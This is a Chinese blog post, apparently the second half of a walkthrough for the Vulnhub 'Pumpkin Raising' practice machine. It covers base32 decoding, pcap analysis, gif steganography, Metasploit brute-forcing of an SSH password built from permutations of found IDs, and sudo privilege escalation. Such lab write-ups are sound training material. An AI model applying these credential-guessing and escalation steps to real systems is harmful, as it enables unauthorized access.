<img src="https://p0.ssl.qhimg.com/t01dcbb84eaf2f983cb.png" alt="" />
又是一串注释掉的密文字符串，丢base64解不出，试试base32解。
<img src="https://p4.ssl.qhimg.com/t013cdaaebc0abb1e13.png" alt="" /><br />
解密为：/scripts/spy.pacp，访问一哈，下载下来一个tcp包文件，wireshark打开，随意点一个带有push字的包
<img src="https://p4.ssl.qhimg.com/t01a547d231be61f95d.png" alt="" /><br />
发现明文传输，毫不犹豫追踪TCP流，发现ID：<strong>50609</strong>~lucky，不错哟
<img src="https://p0.ssl.qhimg.com/t01bdb3bf118ca2bfe9.png" alt="" /><br />
<strong>重点</strong>来了：别忘了上面pumpkin.html右边的滑块，拉到底发现被注释掉的十六进制的数组，用网站工具解密，找到Seeds ID: <strong>96454</strong>（本人习惯比较差，不喜欢f12，所以这个点真的后知后觉才发现，小声bb）
<img src="https://p1.ssl.qhimg.com/t019011a2365ec4ab70.png" alt="" /><br />
终于功夫不负有心人，已经解出三个id，根据作者靶机下载页面的提示一共有四个id。总结一下，还有一张gif图片藏着一个id，解密出来再加上已经解密出的三个id，就大功告成了。（这么自信？）
既然Stegsolve试了不行咱们就换一个，使用stegosuite解密，试了一下需要密码，忽然想到之前hidden目录下奇怪的字符，赶紧复制下来一个一个试，还是不行，提示密码错误。难受~难道是图片错了？果然，在小弟的坚持不懈的努力下，发现了猫腻。猫腻不在于图片下的隐写，而在于哪张图片。。。最后隐写图片是那张jackolatantern.gif。（靶机作者已经被我吐槽一万遍）
<img src="https://p0.ssl.qhimg.com/t01b84499f6fcadf696.png" alt="" /><br />
提取文本，得到id：<strong>86568</strong>
<img src="https://p1.ssl.qhimg.com/t012f800923d47719dd.png" alt="" /><br /></p>
<h4 id="24-id已齐letsgo">2.4 id已齐，LetsGo</h4>
<p>就这样，一共找到四个seeds id： 69507 96454 50609 86568
接着小弟看着这个四个id，猜测用户名jack并且陷入了深深的沉思，到底是用msf跑呢，还是海德拉~没错小弟就是这么纠结- -(脚本是python的内建函数写的文尾附上)
<img src="https://p5.ssl.qhimg.com/t01055293e5c3e16d1c.png" alt="" /></p>

<h2 id="三组合拳ssh提权">三、组合拳——ssh,提权</h2>
<p>最后还是用了最爱的msf跑出来密码（先用脚本组合四个id的不同组合即可），如图跑出来了。下一步ssh连吧。
<img src="https://p4.ssl.qhimg.com/t01902662105a1a24ca.png" alt="" /><br />
ssh -l jack pass
<img src="https://p0.ssl.qhimg.com/t016216995943e58194.png" alt="" /><br />
继续行云流水，sudo su。不行？最后参考资料提到权限。省去exp提权~
<img src="https://p4.ssl.qhimg.com/t01a3327fffc5a4be59.png" alt="" /><br /></p>

<h2 id="四总结">四、总结</h2>
<p>总结下来，此次这个靶机的入侵过程虽然有些曲折，本菜也被误导到不少坑里~但是总体来说都不是很难，没有让我们来挖洞找页面漏洞来弹webshell，所以小弟认为比较适合一些有渗透基础的玩家~（对，就是我没错）。<br /></p>

<h4 id="参考资料">参考资料</h4>
<blockquote>
  <p>https://www.360zhijia.com/anquan/413205.html
随机组合脚本:</p>
  <div class="language-applescript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#a,b,c,d代替即可，别忘了python严格的缩进~</span><span class="w">
</span><span class="nv">import</span><span class="w"> </span><span class="nv">itertools</span><span class="w">
	</span><span class="nb">for</span><span class="w"> </span><span class="nv">i</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="nv">itertools</span><span class="p">.</span><span class="nv">permutations</span><span class="p">(</span><span class="err">[</span><span class="nv">a</span><span class="p">,</span><span class="nv">b</span><span class="p">,</span><span class="nv">c</span><span class="p">,</span><span class="nv">d</span><span class="err">]</span><span class="p">,</span><span class="mi">4</span><span class="p">):</span><span class="w">
	</span><span class="nb">print</span><span class="p">(</span><span class="nv">i</span><span class="p">)</span><span class="w">
</span></code></pre></div>  </div>
  <p>have fun！guys.why not do it yourself?</p>
</blockquote>


          <p><a href="/blog/2019/vulnhub/PumpkinRaising/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      

    </div><! --/col-lg-8 -->

    <div class="col-lg-3">
    <h4>Subscribe</h4>
    <div class="hline"></div>
        <p>
        <p class="rss-subscribe"><i class="fa fa-rss"></i> Subscribe to this blog <a href="/feed.xml">via RSS</a>.</p>
        </p>
    <div class="spacing"></div>
    <h4>Categories</h4>
    <div class="hline"></div>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Web</a>
            <span class="badge badge-theme pull-right">12</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 漏洞复现</a>
            <span class="badge badge-theme pull-right">14</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 渗透</a>
            <span class="badge badge-theme pull-right">10</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Vulnhub</a>
            <span class="badge badge-theme pull-right">10</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 安全工具</a>
            <span class="badge badge-theme pull-right">6</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 笔记</a>
            <span class="badge badge-theme pull-right">44</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 软件移植</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Arm</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 主动防御</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 技巧</a>
            <span class="badge badge-theme pull-right">3</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Android reverse</a>
            <span class="badge badge-theme pull-right">6</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 排错</a>
            <span class="badge badge-theme pull-right">3</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Waf</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Maven</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 代码审计</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Python</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 机器学习</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Terminal</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Docker</a>
            <span class="badge badge-theme pull-right">3</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Cve</a>
            <span class="badge badge-theme pull-right">9</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Sql-inject</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Bash</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 内网</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> 信息搜集</a>
            <span class="badge badge-theme pull-right">8</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Fuzz</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Src</a>
            <span class="badge badge-theme pull-right">3</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Vulnhub</a>
            <span class="badge badge-theme pull-right">2</span>
        </p>
    
        <p>
            <a href=""><i class="fa fa-angle-right"></i> Php</a>
            <span class="badge badge-theme pull-right">1</span>
        </p>
    

    <div class="spacing"></div>

    <h4>Popular Tags</h4>
    <div class="hline"></div>
    <p>
        
            <a class="btn btn-theme" href="" role="button">Web (12)</a>	         
        
            <a class="btn btn-theme" href="" role="button">漏洞复现 (14)</a>	         
        
            <a class="btn btn-theme" href="" role="button">渗透 (10)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Vulnhub (10)</a>	         
        
            <a class="btn btn-theme" href="" role="button">安全工具 (6)</a>	         
        
            <a class="btn btn-theme" href="" role="button">笔记 (44)</a>	         
        
            <a class="btn btn-theme" href="" role="button">软件移植 (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Arm (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">主动防御 (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">技巧 (3)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Android reverse (6)</a>	         
        
            <a class="btn btn-theme" href="" role="button">排错 (3)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Waf (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Maven (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">代码审计 (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Python (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">机器学习 (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Terminal (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Docker (3)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Cve (9)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Sql-inject (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Bash (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">内网 (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">信息搜集 (8)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Fuzz (1)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Src (3)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Vulnhub (2)</a>	         
        
            <a class="btn btn-theme" href="" role="button">Php (1)</a>	         
        
    </p>
</div>


  </div><! --/row -->
</div><! --/container -->


        <div id="footerwrap">
    <div class="container">
        <div class="row">
            <div class="col-sm-4">
                <p>本站由哨兵安全实验室支持创办</p>
                <p class="thuhidden">个人感谢<em>@TUNA协会</em>的开源代码</p>
        <p class="thuhidden">Powered by <a href="https://github.com/Bin4xin">Bin4xin</a> &amp; <a title="open code from TUNA mirror-web." href="https://github.com/tuna/mirror-web"><em>这里是开源代码库</em></a>.</p>
                <ul><li><a href="https://profile-counter.glitch.me/bin4xin.github.io/count.svg"> <em>∑ (Bin4xin's GitHub & bin4xin.github.io & SentrySec pages) (Visitor/time)</em> </a>
                    <ul>
                        <li>
                            <img src="https://profile-counter.glitch.me/bin4xin.github.io/count.svg" style="max-width:100%;">
                        </li>
                    </ul>
                </li></ul>

            </div>

            <div class="col-sm-4">
              <h4>有个不成熟的建议？联系：</h4>
                  <div class="thuhidden">
                    <ul class="social">
                      <li>
                      <a><i class="fa fa-envelope"></i> chihou.pro@gmail.com</a>
                      </li>
                      <!-- <li>
                      IRC: <a href="https://webchat.freenode.net/?channels=%23tuna">#tuna at freenode</a>
                      </li> -->
                      <li>
                      <a href="https://github.com/Bin4xin/"><i class="fa fa-github"></i> GitHub </a>
                      </li>
                      <!-- <li>
                      <a href="http://weibo.com/u/5402274706"><i class="fa fa-weibo"></i> 新浪微博</a>
                      </li> -->

                    </ul>
                  </div>
                </div>
            <!-- aaa-->
            <div class="col-sm-4">
              <picture>
  <img src="/assets/img/logo-white.jpg" srcset="/assets/img/logo-white.png 1x, /assets/img/logo-white@2x.png 2x, /assets/img/logo-white@3x.png 3x, /assets/img/logo-white@4x.png 4x" />
  </picture>

              <p style="color: #384452"> The best team on the planet. </p>
            </div>
        </div><!--/row -->
    </div><!--/container -->
</div><!--/footerwrap -->

    </body>
</html>